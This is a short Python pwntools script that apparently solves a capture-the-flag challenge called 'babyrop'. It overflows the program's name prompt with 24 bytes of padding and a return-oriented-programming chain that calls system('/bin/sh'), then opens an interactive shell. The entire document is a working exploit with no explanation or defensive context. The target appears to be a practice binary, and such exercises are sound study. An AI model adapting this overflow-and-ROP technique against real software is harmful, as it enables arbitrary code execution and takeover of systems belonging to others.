from pwn import *
p = process('./babyrop')
#gdb.attach(p)
p.recvuntil("What's your name?")
ret = p64(0x0000000000400479)
pop_rdi = p64(0x0000000000400683)
system = p64(0x0000000000400490)
binsh = p64(0x601048)
exp = "a"*24 + ret + pop_rdi + binsh + system
p.sendline(exp)
p.interactive()
